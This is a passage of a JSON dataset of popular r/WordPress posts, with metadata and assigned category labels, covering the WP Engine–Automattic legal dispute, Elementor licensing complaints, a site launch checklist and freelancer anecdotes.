hours, they need to pay extra.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.98,
    "subreddit_type": "public",
    "ups": 295,
    "downs": 0,
    "created_utc": 1722249140.0,
    "media": null,
    "is_video": false,
    "num_comments": 45,
    "num_reports": null,
    "over_18": false,
    "category": "listicle",
    "category_confidence": 0.92,
    "category_rationale": "Clear list of 6 items offering tips for freelance web developers.",
    "composite_score": 4.037670626899726
  },
  {
    "score": 293,
    "title": "Matt has 72 hours to do this",
    "selftext": "*From the motion:*\n\n\nDefendants, and Defendants’ officers, agents, servants, employees, and attorneys, and \r\nother persons who are in active concert or participation with them are hereby RESTRAINED \r\nAND ENJOINED, from: \n\r\n(a) blocking, disabling, or interfering with WPEngine’s and/or its employees’, users’, \r\ncustomers’, or partners’ (hereinafter “WPEngine and Related Entities”) access to wordpress.org;\n\r\n(b) interfering with WPEngine’s control over, or access to, plugins or extensions (and their respective directory listings) hosted on wordpress.org that were developed, published, or maintained by WPEngine, including those that had been published, developed, or maintained by \r\nWPEngine as of September 20, 2024; and\n\r\n(c) interfering with WPEngine’s and Related Entities’ WordPress installations (i.e., \r\nwebsites built with WordPress software) by using auto-migrate or auto-update commands to \r\ndelete, overwrite, disable, or modify any WPEngine plugin without the express request by or consent of WPEngine and/or its users, customers, or partners (as applicable).\n\r\nThe above, however, does not preclude wordpress.org’s ability to ensure the security and operability of its site consistent with procedures and policies in place as of September 20, 2024.\n\r\nWithin 72 hours, Defendants are ORDERED to:\n\r\n(a) remove the purported list of WPEngine customers contained in the “domains.csv” \r\nfile linked to Defendants’ wordpressenginetracker.com website (which was launched on or about November 7, 2024) and stored in the associated GitHub repository located at  https://github.com/wordpressenginetracker/wordpressenginetracker.github.io.\n\r\n(b) restore WPEngine’s and Related Entities’ access to wordpress.org as it existed as of\r\nSeptember 20, 2024, including:\n\r\n(i) reactivating and restoring all WPEngine employee login credentials to wordpress.org resources (including login credentials to login.wordpress.org) as they existed as of September 20, 2024; \n\r\n(ii) disabling any technological blocking of WPEngine’s and Related Entities’ access to wordpress.org that occurred on or around September 25, 2024, including IP address blocking or other blocking mechanisms; and\n\r\n(iii) restoring WPEngine’s and Related Entities’ access to wordpress.org in the manner that such access existed as of September 20, 2024, including:\n\r\n(1) functionality and development resources (api.wordpress.org, \r\ncore.svn.wordpress.org, plugins.svn.wordpress.org, themes.svn.wordpress.org, \r\ni18n.svn.wordpress.org, downloads.wordpress.org, make.wordpress.org, and translate.wordpress.org); \n\r\n(2) data resources (WordPress Plugin, Theme, and Block Directories, repositories, listings, and other password-protected resources within wordpress.org);\n\r\n(3) security resources (login.wordpress.org); and \n\r\n(4) support resources (trac.wordpress.org and \r\nslack.wordpress.org); and \n\r\n(iv) removing the checkbox at login.wordpress.org that Defendants added on or \rabout October 8, 2024 asking users to confirm that they are “not affiliated with WP Engine in any \rway, financially or otherwise”; and \n\r\n(v) returning and restoring WPEngine’s access to and control of its Advanced \rCustom Fields (“ACF”) plugin directory listing at https://wordpress.org/plugins/advanced-custom-fields, as it existed as of September 20, 2024.\n\nThis Preliminary Injunction is immediately effective upon its entry and shall remain in full \r\nforce and effect through the date on which judgment is entered following the trial of this action. \n\r\nIV. CONCLUSION\r\nFor the reasons set forth above, WPEngine’s motion for a preliminary injunction is \r\nGRANTED.\n\r\nIT IS SO ORDERED.\n\r\nDated: December 10, 2024\n\nEdit: \nsource: \nhttps://storage.courtlistener.com/recap/gov.uscourts.cand.437474/gov.uscourts.cand.437474.64.0.pdf",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.96,
    "subreddit_type": "public",
    "ups": 293,
    "downs": 0,
    "created_utc": 1733882612.0,
    "media": null,
    "is_video": false,
    "num_comments": 152,
    "num_reports": null,
    "over_18": false,
    "category": "playbook",
    "category_confidence": 0.7,
    "category_rationale": "Explicit, ordered steps to be performed to address a legal action.",
    "composite_score": 4.280693045820956
  },
  {
    "score": 286,
    "title": "Elementor Pro’s Anti-Developer, Anti-Collaboration Licensing Model: Why I’m Leaving (And the Disgusting Comment That Sealed It)",
    "selftext": "I have used, advocated for, and developed with Elementor and Elementor Pro for many years. I've developed custom components, plugins, functionality improvements, and more. I've resolved technical and optimization issues, adapted to their changes, and worked around their limitations. If \"Elementor Professional\" were a recognized designation, I would hold it.\n\nBut this - this is my final straw.\n\nBuried in their licensing system is an appalling piece of code:\n\n    &lt;?php // Fake link to make the user think something is going on. In fact, every refresh of this page will re-check the license status. ?&gt;\n\nThis isn't just a bad joke; it's a symptom of everything that has gone wrong with Elementor. Deception. Disrespect. Disregard for the very developers and users who made them successful.\n\nTheir licensing system is now breaking development workflows. Development sites that conform to their own subdomain requirements (`*.test`', etc.) are being flagged, forcing us to reactivate licenses repeatedly. Rebuilding a branch in a container? Reactivate. Deploying a fresh instance for testing? Reactivate. They suggest we “just go ahead and reactivate” or “pre-activate” subdomains for our developers - completely ignoring the reality of modern dev environments. Meanwhile, they strongly discourage sharing license keys or logins (rightfully so), yet refuse to provide a way for teams to validate licensing. Their system effectively forces us to relicense encrypted keys that were securely stored in database backups because of a domain change to one that fits their own \"test/dev/staging site\" licensing requirements.\n\nThis is not about security. This is not about improving developer experience. This is a thinly veiled attack on legitimate users to squeeze out more profit. It is a slap in the face to the developers and agencies that built their ecosystem.\n\nAnd let's be honest - this is just one more offense in a long list:\n\n* They take pull requests and integrate solutions without attribution.\n* They rush out updates that break functionality, introducing more bugs than they fix.\n* Their support has become outright adversarial rather than collaborative.\n* They have abandoned their roots in the WordPress community in favor of corporate greed.\n\nFor too long, I've held onto the belief that \"users get it, and that's what matters most.\" But Elementor has made it clear - they don't respect developers, and they don't respect the community.\n\nSo this is my goodbye.\n\nGoodbye to the gaslighting and deception.   \nGoodbye to the broken updates and careless development.   \nGoodbye to corporate-driven, exploitative licensing schemes.   \nGoodbye to a company that has lost its way.\n\nI will not be part of Elementor's collapse. There are better alternatives - ones that respect developers, honor contributions, and don't treat their users like an inconvenience.\n\nIf you're feeling the same frustration, it's time for us to move on together.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.98,
    "subreddit_type": "public",
    "ups": 286,
    "downs": 0,
    "created_utc": 1738342367.0,
    "media": null,
    "is_video": false,
    "num_comments": 211,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.82,
    "category_rationale": "Strong emotional critique of Elementor's licensing and developer experience.",
    "composite_score": 4.356049827198368
  },
  {
    "score": 285,
    "title": "A checklist I use before launching any new WordPress site",
    "selftext": "Most launch checklists cover backups, SSL, and forms, but anyone managing client sites or high-traffic installs knows the *real* pain points are deeper.\n\n  \nI’ve built my own advanced WordPress launch checklist after years of cleaning up “perfect” launches that later failed under real traffic.\n\n**TL;DR:** This is the stuff that breaks when the site is live, not during the demo.\n\n# Advanced WordPress Launch Checklist\n\n1. **Server &amp; PHP**\n   * Confirm OPcache + object cache (Redis/Memcached) are running.\n   * Test PHP workers under simulated load (e.g., with `ab` or k6).\n   * Check `max_execution_time` and `memory_limit` for plugin-heavy builds.\n2. **Database**\n   * Run `wp db optimize` and clear orphaned options.\n   * Verify no autoloaded options &gt; 1MB (this kills performance on large sites).\n   * Confirm search/replace didn’t break serialized data.\n3. **Security**\n   * Block `wp-config.php` via server rules.\n   * Ensure salts/keys in `wp-config.php` are unique (not defaults).\n   * Audit user roles for stray admins or leftover staging logins.\n4. **Caching / CDN**\n   * Double-check cache headers: static assets should have `cache-control: public, max-age=31536000`.\n   * Verify cache purge triggers after post update or WooCommerce order.\n   * Staging domain URLs are fully purged from CDN.\n5. **SEO &amp; Indexing**\n   * Check canonical tags across templates (no duplicates).\n   * hreflang implementation for multilingual.\n   * OpenGraph/Twitter Card previews (real-world share test, not just plugin settings).\n6. **Monitoring**\n   * Error logging is enabled but *not publicly accessible*.\n   * Uptime monitor configured (Pingdom, HetrixTools).\n   * Slow query logging (helps catch bottlenecks post-launch).\n\n# A real example\n\nOn a WooCommerce store I worked on, we missed that Redis wasn’t purging cart fragments. Everything looked fine at launch, but customers started seeing old carts and ghost sessions. Fixing it after launch was painful. Now it’s hardcoded into my checklist.\n\nWhat’s the **most “hidden” launch issue** you’ve run into that wasn’t obvious during staging?",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.98,
    "subreddit_type": "public",
    "ups": 285,
    "downs": 0,
    "created_utc": 1759135471.0,
    "media": null,
    "is_video": false,
    "num_comments": 53,
    "num_reports": null,
    "over_18": false,
    "category": "playbook",
    "category_confidence": 0.93,
    "category_rationale": "Comprehensive, numbered checklist with actionable launch steps.",
    "composite_score": 4.0575629130405275
  },
  {
    "score": 275,
    "title": "I WAS on Matt's side",
    "selftext": "I see a few comments dispelling the idea that people were ever on Matt's side, but I'll admit, I was.\n\nIf you're the kind of person who can't understand how anyone was ever on his side, here's how I felt at first:\n\n* WPEngine *is* confusing to \"an idiot in a hurry\" in a way that the other WP brands aren't, because \"Engine\" carries a particular connotation in our industry. \n* I hate it when companies get rid of vanilla features. If a company was using WPE and had to revert their entire site in order to fix a single botched page because WPE doesn't want to pay for storing page revisions, they're not going to realize that's WPE's fault, they're just going to think WordPress sucks. Bad hosts absolutely affect WordPress's reputation.\n* ACF is a hugely important plugin (and those features honestly should have been core functionality a decade ago), but WPEngine can't claim it as a meaningful contribution to the ecosystem, considering most of the work on it was done before they purchased it, and because they got rid of the lifetime purchase option. ACF is now just a demo for their freemium subscription.\n* Sponsoring a conference isn't giving back, it's advertising. \n\nI even could have supported \"hey, everybody has a right to use the code, but big companies don't have the right to freeload off WP.org resources\" if he did it in a way that didn't screw over WP users (ie, a year of notice).\n\nBut now? Abusing his power to break his competitor's sites overnight, and forcing ACF users to switch to his fork, and laundering their reviews as his own? That's way worse than WPE being a shitty host and a lackluster community member. That's extortion and fraud, and Matt has to be stopped.\n\nI'm hoping WPE wins the injunction, and Matt gets booted from leadership. I'm also keeping a close eye on AspirePress as a contingency plan.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.86,
    "subreddit_type": "public",
    "ups": 275,
    "downs": 0,
    "created_utc": 1729348104.0,
    "media": null,
    "is_video": false,
    "num_comments": 219,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.78,
    "category_rationale": "Emotional critique of Matt/WP Engine with moral condemnation.",
    "composite_score": 4.257120422476321
  },
  {
    "score": 275,
    "title": "Unintended side effects of Matt hijacking ACF only made more money for WP Engine",
    "selftext": "I'm likely not the only dev for enterprise level corporations with multiple WordPress websites, both single and multisite installs.\n\nYesterday, I had to write a stupidly annoying email summarizing these actions and how they're currently impacting our sites, specificallu how an author of a few free plugins we use cannot access their plugins for routine maintenance anymore, including ACF and Better Search Replace. \n\nWhen they asked me questions I didn't have the answers to, I had to say things like, \"we all knew Matt could because he's the owner, but we never thought he would\" \n\nThey asked questions like what other plugins are affected and I had to list off all the plugins under the now banned account of WP Engine. \n\nWhen giving them options on how to move forward, do you know which one wins in the Fast vs Easy vs Cheap for a business of this level? \n\nFast and easy. \n\nToday, I installed pro versions of ACF and Better Search Replace on so many sites. They purchased the licenses for unlimited sites. They scoffed at a $99/yr price tag in the meeting and was like, \"well that's the obvious choice!\" \n\nCorporations don't really care about the ethics or your own legal battles. They care about their bottom line and it just got tampered with.\n\nSo... It's not just small time devs, startups, nonprofits, small businesses, and hobbyists that use WordPress. Matt actively put money in WP Engine's pockets... annually now going forward. ",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.94,
    "subreddit_type": "public",
    "ups": 275,
    "downs": 0,
    "created_utc": 1729095218.0,
    "media": null,
    "is_video": false,
    "num_comments": 97,
    "num_reports": null,
    "over_18": false,
    "category": "value-add",
    "category_confidence": 0.7,
    "category_rationale": "Offers reasoning about business incentives and consequences of actions.",
    "composite_score": 4.141522119911465
  },
  {
    "score": 267,
    "title": "BuddyPress lead developer quits WP: \"Black-out WordPress\"",
    "selftext": "Mathieu Viet has shared thoughts on quitting the BuddyPress project and dropping WP as a platform altogether.\n\n&gt;While Mr. Mullenweg's first attacks made me quit this community and stop contributing to WordPress® open source projects (including BuddyPress®), the latest one (making the premium code of a plugin marketed by the attacked competitor available for free) convinced me that disapproving and condemning them as a former contributor was not enough. Indeed, I have also decided to stop using WordPress® to power this website.\n\nhttp://imathi.eu/",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.96,
    "subreddit_type": "public",
    "ups": 267,
    "downs": 0,
    "created_utc": 1733089774.0,
    "media": null,
    "is_video": false,
    "num_comments": 97,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.65,
    "category_rationale": "Emotional critique about WordPress leadership and project directions.",
    "composite_score": 4.143747831875037
  },
  {
    "score": 256,
    "title": "Just use Wordpress",
    "selftext": "I’ve seen and used multiple platforms for building websites, but nothing came close to what WordPress offers.\n\nOwnership, speed, flexibility, affordability – These are the things WordPress is good at.\n\nNew platforms like Framer are trying to make building websites simple and intuitive. As simple as it may seem, once you get through the first layer of just adding something to a page, it gets complex from there on. Framer is terrible to use on a low powered PC. Even building simple things like a menu is complicated on Framer.\n\nWix, SquareSpace, Framer, Webflow – all these tools have niche users. People who are familiar with design tools like Figma might prefer using Framer. Wix and SquareSpace might be for people who don’t have any experience at all with building and maintaining a website. And certain kind of people might enjoy using Webflow.\n\nThese platforms are trying to make building a website simpler and more intuitive, but important things like maintaining the website, having ownership of it and posting whatever you want to post on it, that’s not offered by these platforms. You are limited with your choices and if any of these platforms decide to kick you off their server, you pretty much can’t do anything. WordPress on the other hand gives you ownership of your data and you can pretty much build whatever kind of site you want with WordPress. If you don’t like your hosting provider, you can switch to another one, or even host the entire site on your own server at your home.\n\nI’m not saying that other platforms don’t have a place or are not worthy. If you want to build and maintain websites with ownership and flexibility, then WordPress is your best choice. I think it’s a good thing that we have other platforms and people working on newer solutions to simplify web development. But instead of chasing a shiny new object, remember that we have something solid that works really well.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.91,
    "subreddit_type": "public",
    "ups": 256,
    "downs": 0,
    "created_utc": 1755020157.0,
    "media": null,
    "is_video": false,
    "num_comments": 184,
    "num_reports": null,
    "over_18": false,
    "category": "value-add",
    "category_confidence": 0.78,
    "category_rationale": "Central argument extolling WordPress with reasoning and comparisons.",
    "composite_score": 4.226018987532801
  },
  {
    "score": 255,
    "title": "Gravity PDF - For security, the canonical plugin has moved off WordPress.org",
    "selftext": "Saw this notice when I was in a client dashboard today. They link to a [Gravity PDF news article](https://gravitypdf.com/news/installing-and-upgrading-to-the-canonical-version-of-gravity-pdf/) which in part states:\n\n&gt;WordPress co-founder Matt Mullenweg has [weaponized WordPress.org and appropriated the popular Advanced Custom Fields plugin from its creators](https://wptavern.com/acf-plugin-forked-to-secure-custom-fields-plugin). This action sets a dangerous precedent, and violates the integrity and security of the platform.\n\n&gt;To minimize the risks to ourselves and our users, the canonical (primary) version of the free and open-source Gravity PDF plugin is now being distributed directly from GravityPDF.com. The canonical release includes an alternative update mechanism that receives new features, security updates, and bug fixes directly from our website. ",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.98,
    "subreddit_type": "public",
    "ups": 255,
    "downs": 0,
    "created_utc": 1729039888.0,
    "media": null,
    "is_video": false,
    "num_comments": 81,
    "num_reports": null,
    "over_18": false,
    "category": "value-add",
    "category_confidence": 0.74,
    "category_rationale": "Explains security/licensing shift and implications for users.",
    "composite_score": 4.100146891503708
  },
  {
    "score": 250,
    "title": "You don't need a plugin for that",
    "selftext": "Watched someone install a 2MB plugin yesterday to add a contact form. The plugin came with an email marketing suite, a CRM, analytics dashboards, and approximately 600 features they'll never touch.\n\nThe form itself? Three fields.\n\nThis is what we've become. WordPress has trained us to reach for a plugin the moment we face literally any task. Need to change a font color? Plugin. Want to add a line of text to your footer? Plugin. Trying to do something that's maybe 10 lines of PHP? Better install something that loads 47 JavaScript libraries.\n\nAnd then we wonder why sites load like they're being served through a 56k modem.\n\nThe worst part isn't the bloat ... it's that half these plugins will break during the next WordPress update, and you'll spend three hours troubleshooting which one decided to have a meltdown. Or they'll just... stop being maintained. Cool, now you've got orphaned code sitting in your database *forever*.\n\nI'm not saying write everything from scratch, but maybe ... just maybe ... check if your theme already does it, or if functions.php can handle it, before adding another dependency that'll haunt you for years.\n\nWhat's the most ridiculous \"there's a plugin for that\" moment you've encountered?\n",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.93,
    "subreddit_type": "public",
    "ups": 250,
    "downs": 0,
    "created_utc": 1759675544.0,
    "media": null,
    "is_video": false,
    "num_comments": 155,
    "num_reports": null,
    "over_18": false,
    "category": "value-add",
    "category_confidence": 0.72,
    "category_rationale": "Argues against plugin bloat and suggests more efficient approaches.",
    "composite_score": 4.193736020658268
  },
  {
    "score": 246,
    "title": "Stage appears to be set for the removal of ACF from the repo",
    "selftext": "This morning Matt posted looking for alternatives to ACF, with the implication people either would or should be moving off.  Later Automattic posted that they found a security issue in ACF in the repo, and filed a notice giving them 30 days to fix it. Of course, WP Engine no longer has access to the repo, so they can't reasonably fix it.\n\nThis seems like he's basically setting a 30 day countdown timer, after which ACF will be removed from the repo (or possibly ownership transferred to someone else - can you guess who?).  This seems pretty petty to me, but I wanted to see what everyone else thinks of this.\n\nhttps://preview.redd.it/y7dfjyn32zsd1.png?width=1174&amp;format=png&amp;auto=webp&amp;s=8e5816c55746695dd1fe18bca25f2b1e88e2b264\n\nhttps://preview.redd.it/3bi5h0o32zsd1.png?width=1186&amp;format=png&amp;auto=webp&amp;s=17e442dabed400140ae121d2477922299d9790a9",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.97,
    "subreddit_type": "public",
    "ups": 246,
    "downs": 0,
    "created_utc": 1728149052.0,
    "media": null,
    "is_video": false,
    "num_comments": 305,
    "num_reports": null,
    "over_18": false,
    "category": "other",
    "category_confidence": 0.58,
    "category_rationale": "Discussion about an impending removal decision with opinion; lacks actionable steps or a model.",
    "composite_score": 4.363057666500456
  },
  {
    "score": 240,
    "title": "I want you make me a website that functions like Facebook with a market place and I can charge for ads, I will give you $1,500 for it and pay you from the proceeds of the website.",
    "selftext": "Yup, I got an AH of a client ask this of me,  He said that while I he was driving with me in the passenger seat.  All I could do was laugh my ass off as hard I could. I didn't even try to hide my laughter.  He just looked at me shocked and authentically surprised and offended.  When I saw his face I laughed even harder, I think I got to the point of me almost crying.  The audacity. \n\nMore info:  He also wanted the website to be a no maintenance website.  He didn't want to have to hire anyone to be on there all the time or even himself, he could barely open his email.  He wanted it as a passive income and the \"paying me from site\" was to motivate me in making a good website.  Also if he ever needed it, but why would he if I actually delivered a maintenance free site, he would give me $100 buckaroos to fix what ever needed fixing.  But if that was the case then it would not be maintenance fee and he would not feel right giving me so much money for it. LMAO yeah I never spoke this guy ever again.  ",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.88,
    "subreddit_type": "public",
    "ups": 240,
    "downs": 0,
    "created_utc": 1750180615.0,
    "media": null,
    "is_video": false,
    "num_comments": 99,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.82,
    "category_rationale": "Primarily a vent about a client's unrealistic website request with humorous judgment.",
    "composite_score": 4.0420170425748685
  },
  {
    "score": 217,
    "title": "The motion by WPE to speed up this first phase of the case has been granted.",
    "selftext": "As per title. Here's the ruling: https://storage.courtlistener.com/recap/gov.uscourts.cand.437474/gov.uscourts.cand.437474.34.0_2.pdf\n\nAccording to that ruling, the following dates have been set:\n\n1. Defendants’ Opposition to the PI Motion shall be filed on or before October 30, 2024;\n2. Plaintiff’s Reply shall be filed on or before November 4, 2024;\n3. The PI Motion is hereby set for hearing on November 26 , 2024, at 10:30 a.m.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.98,
    "subreddit_type": "public",
    "ups": 217,
    "downs": 0,
    "created_utc": 1729722000.0,
    "media": null,
    "is_video": false,
    "num_comments": 63,
    "num_reports": null,
    "over_18": false,
    "category": "other",
    "category_confidence": 0.6,
    "category_rationale": "Informational legal update with dates and a ruling link; no guidance or steps.",
    "composite_score": 3.976546480596548
  },
  {
    "score": 136,
    "title": "These yearly Subscriptions for plugins are out of control! ",
    "selftext": "I've noticed a continue trend for the past few years, all these plugins are now subscriptions per year.  Is driving me off the walls, the developer community have become a money grabbing vampires like these big corporations. \n\nAnyone have some plugins that they use that has life time purchase? \n\nhere's are few i like: \n\nWPAmelia \n\nWPForms - alternatives anyone?   \nViewWPForms - A plugin on top of core plugin subscription &gt;&gt; drives me nuts   \nI'm in search of a WebHook Automator at the moment, i've seen Uncanny Automator and Automator WP. Which one is the best? Or do you have alternative solutions??\n\n  \nThanks! ",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.87,
    "subreddit_type": "public",
    "ups": 136,
    "downs": 0,
    "created_utc": 1725088427.0,
    "media": null,
    "is_video": false,
    "num_comments": 188,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.8,
    "category_rationale": "Emotional complaint about plugin subscriptions with requests for alternatives.",
    "composite_score": 3.927451469243029
  }
]